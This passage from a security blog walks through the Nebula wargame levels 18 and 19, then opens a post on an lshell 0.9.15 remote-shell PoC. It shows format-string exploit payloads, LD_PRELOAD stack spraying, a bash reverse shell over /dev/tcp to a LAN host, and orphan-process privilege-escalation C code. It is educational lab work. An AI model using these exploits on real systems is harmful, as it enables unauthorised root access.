</span><span class='line'>00c9b000-00cb7000 r-xp 00000000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
</span><span class='line'>00cb7000-00cb8000 r--p 0001b000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
</span><span class='line'>00cb8000-00cb9000 rw-p 0001c000 07:00 45092      /lib/i386-linux-gnu/libgcc_s.so.1
</span><span class='line'>00cd6000-00e4c000 r-xp 00000000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>00e4c000-00e4e000 r--p 00176000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>00e4e000-00e4f000 rw-p 00178000 07:00 44973      /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>00e4f000-00e52000 rw-p 00000000 00:00 0 
</span><span class='line'>08048000-0804a000 r-xp 00000000 07:00 12922      /home/flag18/flag18
</span><span class='line'>0804a000-0804b000 r--p 00001000 07:00 12922      /home/flag18/flag18
</span><span class='line'>0804b000-0804c000 rw-p 00002000 07:00 12922      /home/flag18/flag18
</span><span class='line'>082c5000-082e6000 rw-p 00000000 00:00 0          [heap]
</span><span class='line'>b77a8000-b77a9000 rw-p 00000000 00:00 0 
</span><span class='line'>b77b1000-b77b4000 rw-p 00000000 00:00 0 
</span><span class='line'>bfabf000-bfae0000 rw-p 00000000 00:00 0          [stack]
</span><span class='line'>Aborted
</span><span class='line'>level18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>


<p>I guess not.  It appears it&rsquo;s been compiled with a bit of protection:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./checksec.sh --file flag18
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   flag18
</span><span class='line'>level18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>


<p>On deeper inspection of the code, it appears there are several logic flaws that could allow simple execution of a root shell.</p>

<p>The first issue is that there&rsquo;s no restriction on what file we&rsquo;re debugging to, so long as we&rsquo;ve got the privileges required to open it.  In this case, this means we can debug to the same file that we&rsquo;re checking passwords against.  Since we can&rsquo;t actually read the file, we need to infer:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./flag18 -d /home/flag18/password 
</span><span class='line'>^Clevel18@nebula:/home/flag18$ ls -lh password
</span><span class='line'>-rw------- 1 flag18 flag18 31 2013-03-20 00:38 password
</span><span class='line'>level18@nebula:/home/flag18$ echo Starting up. Verbose level = 0 | wc -c
</span><span class='line'>31
</span><span class='line'>level18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>


<p>So we read without error and we know the exact data in the file.  The problem with this is that it strips newlines, and with fgets we don&rsquo;t have a nice way of inserting them.</p>

<p>The second issue I discovered involved the command site exec, which doesn&rsquo;t properly format output, and won&rsquo;t append newlines (which may be used to further the first issue).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg 
</span><span class='line'>site exec %n
</span><span class='line'>*** %n in writable segment detected ***
</span><span class='line'>Aborted
</span><span class='line'>level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg 
</span><span class='line'>site exec %4$x
</span><span class='line'>*** invalid %N$ use detected ***
</span><span class='line'>Aborted
</span><span class='line'>level18@nebula:/home/flag18$</span></code></pre></td></tr></table></div></figure>


<p>This means that our binary was likely compiled with <a href="https://wiki.edubuntu.org/ToolChain/CompilerFlags">FORTIFY_SOURCE=2</a>.  <a href="http://gcc.gnu.org/ml/gcc-patches/2004-09/msg02055.html">Here&rsquo;s</a> the patch that explains what it is and prevents, and the differences between 1 and 2.  Because I don&rsquo;t take doors slammed in my face very well, and it&rsquo;s late, it&rsquo;s time to break out the <a href="http://www.phrack.org/issues.html?issue=67&amp;id=9">phrack</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ gdb ./flag18 
</span><span class='line'>Reading symbols from /home/flag18/flag18...(no debugging symbols found)...done.
</span><span class='line'>(gdb) r -d /tmp/dbg 
</span><span class='line'>Starting program: /home/flag18/flag18 -d /tmp/dbg
</span><span class='line'>site exec %1$*269168516$x %1073741824$                            
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x0028b359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>Exploitation of this wasn&rsquo;t trivial, but it was eye-opening into some of the things you can accomplish with format string vulnerabilities.  Because our binary was compiled with FORTIFY_SOURCE, there are essentially two things we need to do: disable the FORTIFY flag, and disable the argument filler.  The argument filler essentially sets every argument in arguments[argc] to -1, then fills in the user supplied arguments.  Any -1&rsquo;s remaining will cause an error.  At a high level we&rsquo;re doing this:
+ Disable FORTIFY_SOURCE flag
+ Modify nargs to blow up
+ Be happy</p>

<p>The Phrack article does a better job of explaining this than I do, so if you&rsquo;d like an in-depth analysis of all this, follow the article.  Anyway &mdash; finding and disabling FORTIFY_SOURCE:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ gdb ./flag18 
</span><span class='line'>Reading symbols from /home/flag18/flag18...(no debugging symbols found)...done.
</span><span class='line'>(gdb) b vfprintf
</span><span class='line'>Function "vfprintf" not defined.
</span><span class='line'>Make breakpoint pending on future shared library load? (y or [n]) y
</span><span class='line'>Breakpoint 1 (vfprintf) pending.
</span><span class='line'>(gdb) r -d /tmp/dbg
</span><span class='line'>site exec %1$*2222848$x %1073741824$
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) tb *(vfprintf+4649)
</span><span class='line'>Temporary breakpoint 2 at 0x172359
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) x/x $eax
</span><span class='line'>0xbfffef60:    0xfbad8004
</span><span class='line'>(gdb) x/20wx $eax
</span><span class='line'>0xbfffef60:    0xfbad8004    0xbffff4f8    0x0017192c    0xbffff528
</span><span class='line'>0xbfffef70:    0xbfffcf60    0xbfffcf60    0xbfffef60    0x00000000
</span><span class='line'>0xbfffef80:    0x00000000    0x00000000    0x00000027    0x08049017
</span><span class='line'>0xbfffef90:    0xfbad8004    0x00000000    0x00000000    0x00000004
</span><span class='line'>0xbfffefa0:    0xbfffcf90    0xbf00cfaf    0x00000000    0x00000000
</span><span class='line'>(gdb) x/wx 0xbfffef9c
</span><span class='line'>0xbfffef9c:    0x00000004
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s obviously a bit of cheating here, but bare with me: we&rsquo;re essentially breaking on vfprintf, which receives a file pointer, a formatter, and an argument list.  We then take a peek at the stack, note our file pointer, and find the flag inside (0x000000004).  We know need to calculate the offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/wx 0xbfffef9c
</span><span class='line'>0xbfffef9c:    0x00000004
</span><span class='line'>(gdb) p/d ((0xbfffef9c-$ecx)&0xffffffff)/4
</span><span class='line'>$1 = 2847
</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>


<p>And accounting for off-by-one, it&rsquo;s 2848.  So:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r -d /tmp/dbg
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /home/flag18/flag18 -d /tmp/dbg
</span><span class='line'>site exec %1$*2848$x %1073741824$
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x00171140 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) tb *(vfprintf+4649)
</span><span class='line'>Temporary breakpoint 4 at 0x172359
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>
</span><span class='line'>Temporary breakpoint 4, 0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) x/i $eip
</span><span class='line'>=&gt; 0x172359 &lt;vfprintf+4649&gt;:    mov    DWORD PTR [edx+eax*4],0x0
</span><span class='line'>(gdb) x/wx $ecx+$eax*4
</span><span class='line'>0xbfffef9c:    0x00000004
</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>


<p>Great, we&rsquo;ve got the correct value for clobbering that flag.  Now we need to find the offset for clobbering nargs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) find 0xbfff0000, 0xbffffff0, 0xdeadbeef
</span><span class='line'>0xbfff5568
</span><span class='line'>0xbfff59ec
</span><span class='line'>2 patterns found.
</span><span class='line'>(gdb) -r 
</span><span class='line'>Starting program: /home/flag18/flag18 -d /tmp/dbg
</span><span class='line'>site exec %1$*283434$x %1073741824$
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x00172359 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) p/d (0xbfff5568-$ecx)/4 + 1
</span><span class='line'>$6 = 479
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>I got stuck here for awhile, and after some googling I discovered someone had already solved this level this way!  So I took <a href="http://v0ids3curity.blogspot.com/2012/09/exploit-exercise-format-string.html">his</a> advice and created an environmental variable that would lower the stack address and not segfault.  The final phase is now upon us; smuggling shellcode in.  The Phrack article gets a little hairy at this point, so instead of screwing around with adjusting stack offsets, I decided to just take the route that v0id took in his blog post.  His process involves setting the loggedin variable by way of taking control of uninitialized stack memory, thanks to <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">Rosenburg&rsquo;s</a> fantastic post on this topic:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x00d7af00 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
</span><span class='line'>(gdb) i r
</span><span class='line'>eax            0x41414141    1094795585
</span><span class='line'>ecx            0x0    0
</span><span class='line'>edx            0x1    1
</span><span class='line'>ebx            0xeafff4    15400948
</span><span class='line'>esp            0xbfdb8b9c    0xbfdb8b9c
</span><span class='line'>ebp            0xbfdb97e8    0xbfdb97e8
</span><span class='line'>esi            0xbfdbb810    -1076119536
</span><span class='line'>edi            0xbfdb8bc0    -1076130880
</span><span class='line'>eip            0xd7af00    0xd7af00 &lt;vfprintf+11728&gt;
</span><span class='line'>eflags         0x10246    [ PF ZF IF RF ]
</span><span class='line'>cs             0x73    115
</span><span class='line'>ss             0x7b    123
</span><span class='line'>ds             0x7b    123
</span><span class='line'>es             0x7b    123
</span><span class='line'>fs             0x0    0
</span><span class='line'>gs             0x33    51
</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>


<p>So we just need to find the loggedin variable, then call shell on it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/2i $eip
</span><span class='line'>=&gt; 0x8048928 &lt;main+376&gt;:    cmp    DWORD PTR ds:0x804b0b4,0x1
</span><span class='line'>   0x804892f &lt;main+383&gt;:    jle    0x804894d &lt;main+413&gt;
</span><span class='line'>(gdb) x/x 0x804b0b4
</span><span class='line'>0x804b0b0 &lt;globals+4&gt;:    0x00000000</span></code></pre></td></tr></table></div></figure>


<p>Stick that into our LD_PRELOAD, sprinkle in a bit of stack alignment, and&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ export LD_PRELOAD=`python -c 'print "\xb4\xb0\x04\x08"*8000'`
</span><span class='line'>level18@nebula:/home/flag18$ gdb ./flag18
</span><span class='line'>(gdb) r -d /tmp/dbg
</span><span class='line'>site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
</span><span class='line'>shell
</span><span class='line'>./flag18: -d: invalid option
</span><span class='line'>Usage:    ./flag18 [GNU long option] [option] ...
</span><span class='line'>    ./flag18 [GNU long option] [option] script-file ...
</span><span class='line'>GNU long options:
</span><span class='line'>    --debug
</span><span class='line'>    --debugger
</span><span class='line'>    --dump-po-strings
</span><span class='line'>    --dump-strings
</span><span class='line'>    --help
</span><span class='line'>    --init-file
</span><span class='line'>    --login
</span><span class='line'>    --noediting
</span><span class='line'>    --noprofile
</span><span class='line'>    --norc
</span><span class='line'>    --posix
</span><span class='line'>    --protected
</span><span class='line'>    --rcfile
</span><span class='line'>    --restricted
</span><span class='line'>    --verbose
</span><span class='line'>    --version
</span><span class='line'>Shell options:
</span><span class='line'>    -irsD or -c command or -O shopt_option        (invocation only)
</span><span class='line'>    -abefhkmnptuvxBCHP or -o option
</span><span class='line'>level18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>


<p>Success!  It&rsquo;s clearly passing in the -d flag to sh, so&hellip;</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level18@nebula:/home/flag18$ ./flag18 --rcfile -d /tmp/dbg
</span><span class='line'>site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
</span><span class='line'>shell
</span><span class='line'>/tmp/dbg: line 1: Starting: command not found
</span><span class='line'>/tmp/dbg: line 2: syntax error near unexpected token `||'
</span><span class='line'>/tmp/dbg: line 2: `|| %134525108%-1274542928 %'
</span><span class='line'>level18@nebula:/home/flag18$ cat /tmp/Starting
</span><span class='line'>#!/bin/bash
</span><span class='line'>/bin/bash -i &gt; /dev/tcp/192.168.1.74/5555 0&gt;&1
</span><span class='line'>level18@nebula:/home/flag18$ export PATH=/tmp:$PATH
</span><span class='line'>level18@nebula:/home/flag18$ ./flag18 --rcfile -d /tmp/dbg
</span><span class='line'>site exec |%20$n| %1$*479$ %1$*2848$ %1073741824$
</span><span class='line'>shell
</span><span class='line'>flag18@nebula:/home/flag18$ </span></code></pre></td></tr></table></div></figure>


<p>A shell was waiting for me on 192.168.1.74:5555.  Lots of subtle intricacies here, but really quite fun.</p>

<p>The third issue is the following snippet:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>26  fp = fopen(PWFILE, "r");
</span><span class='line'> 27  if(fp) {
</span><span class='line'> 28    char file[64];
</span><span class='line'> 29
</span><span class='line'> 30    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
</span><span class='line'> 31      dprintf("Unable to read password file %s\n", PWFILE);
</span><span class='line'> 32      return;
</span><span class='line'> 33    }
</span><span class='line'> 34                fclose(fp);
</span><span class='line'> 35    if(strcmp(pw, file) != 0) return;    
</span><span class='line'> 36  }
</span><span class='line'> 37  dprintf("logged in successfully (with%s password file)\n", 
</span><span class='line'> 38    fp == NULL ? "out" : "");
</span><span class='line'> 39  
</span><span class='line'> 40  globals.loggedin = 1;</span></code></pre></td></tr></table></div></figure>


<p>If the application fails to read PWFILE, the flow will automatically assume the user is logged in.  This appears to be either the easy or intermediate way, as source code explicitly calls this case out (with%s password file).  This could be defeated by opening up a ton of files and running the binary, effectively erroring out fopen and getting the loggedin flag set.</p>

<h3>Level 19</h3>


<p>We now arrive at the final level of Nebula.  This level checks the owner of the calling process and, if root, pops a shell.  This level was kinda neat because it requires you to have an understanding of how forking and parent/child processing works; and if you know that, it&rsquo;s pretty easy.  In this level we&rsquo;re going to exploit an <a href="http://www.geekride.com/orphan-zombie-process/">orphan process</a> and its reclamation process.  When a parent of a child process terminates, the child process stays alive and becomes an orphan process.  This orphan process is automatically reclaimed by an init process:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Parent generates child process:
</span><span class='line'>            -- child
</span><span class='line'>           /
</span><span class='line'>parent ---/
</span><span class='line'>
</span><span class='line'>Parent dies:
</span><span class='line'>        -- child
</span><span class='line'>       X
</span><span class='line'>x ----/
</span><span class='line'>
</span><span class='line'>init process discovers child and adopts:
</span><span class='line'>         -- child
</span><span class='line'>        /
</span><span class='line'>init---/</span></code></pre></td></tr></table></div></figure>


<p>So we want to fork off a process and kill the parent before it calls flag19.  Then, when it goes to stat the process, it will stat init instead of us thereby assuming the role of root.  Here&rsquo;s the code for achieving that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>
</span><span class='line'>void main(void){
</span><span class='line'>    pid_t pid;
</span><span class='line'>    char cmd[]   = "/home/flag19/flag19";
</span><span class='line'>    char *argv[] = {"/bin/sh", "-c", "/bin/getflag &gt; /tmp/flagged"};
</span><span class='line'>
</span><span class='line'>    switch( pid = fork() ){
</span><span class='line'>        case -1:
</span><span class='line'>            perror("failed to fork\n");
</span><span class='line'>        case 0:
</span><span class='line'>            // execute command when parent dies
</span><span class='line'>            sleep(2);
</span><span class='line'>            execvp(cmd, argv);
</span><span class='line'>        default:
</span><span class='line'>            sleep(1); // wait a sec
</span><span class='line'>            exit(1); // ok kill parent
</span><span class='line'>        }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>And flag was waiting for us in <code>/tmp/flagged</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[lshell 0.9.15 pathing vulnerability]]></title>
    <link href="http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability/"/>
    <updated>2012-12-30T22:43:42-07:00</updated>
    <id>http://hatRiot.github.io/blog/2012/12/30/lshell-0.9.15-pathing-vulnerability</id>
    <content type="html"><![CDATA[<p>While working through Kioptrix level 4, I stumbled into <a href="https://github.com/ghantoos/lshell">lshell</a>, a limited shell environment developed in Python.  I don&rsquo;t want to walk through the vulnerability again, but at a high level versions &lt;= 0.9.15 are vulnerable to an unsanitized eval() call with user supplied input.  I couldn&rsquo;t find a working PoC, so I wrote one.</p>

<p>This will verify the install and spawn a pseudo-shell for running commands on the remote host.  While it may be more beneficial to just log in and run the exploit to spawn /bin/bash, this is a nice hacky way to quickly enumerate and tool around on the back end:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~/kioptrix_l4# python lshell_remote.py john ****** 192.168.1.39
</span><span class='line'>[!] .............................
</span><span class='line'>[!] lshell &lt;= 0.9.15 remote shell.
</span><span class='line'>[!] note: you can also ssh in and execute '/bin/bash'
</span><span class='line'>[!] .............................
</span><span class='line'>[!] Checking host 192.168.1.39...
</span><span class='line'>[+] vulnerable lshell found, preparing pseudo-shell...
</span><span class='line'>$ id
</span><span class='line'>uid=1001(john) gid=1001(john) groups=115(admin),1001(john)
</span><span class='line'>$ ls -l
</span><span class='line'>total 48
</span><span class='line'>-rwxr-xr-x 1 john john  1544 2009-01-20 19:51 install.sh
</span><span class='line'>-rw-r--r-- 1 john john  7715 2009-01-20 19:06 lib_mysqludf_sys.c
</span><span class='line'>-rw-r--r-- 1 john john  9934 2009-01-21 19:42 lib_mysqludf_sys.html
</span><span class='line'>-rwxr-xr-x 1 john john 12896 2009-01-19 04:11 lib_mysqludf_sys.so
</span><span class='line'>-rw-r--r-- 1 john john  1647 2009-01-21 19:43 lib_mysqludf_sys.sql
</span><span class='line'>-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
</span><span class='line'>$ ls -l | grep 'Makefile'
</span><span class='line'>-rw-r--r-- 1 john john   122 2009-01-19 04:11 Makefile
</span><span class='line'>$ exit
</span><span class='line'>root@bt:~/kioptrix_l4#</span></code></pre></td></tr></table></div></figure>


<p>You can run pretty much everything except for binary files; this is because of the shell environment changing. I wasn&rsquo;t able to figure out a clean way to attach a TTY to the stdin/stdout/stderr, so if anyone knows of a way to do this with Paramiko, drop me a message.  I&rsquo;ll take any bug reports as well.  This requires Paramiko libraries to be installed; tested with Python 2.7.x.</p>

<p><a href="http://pastebin.com/r7LCdeTC">Pastebin</a> link for download and code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
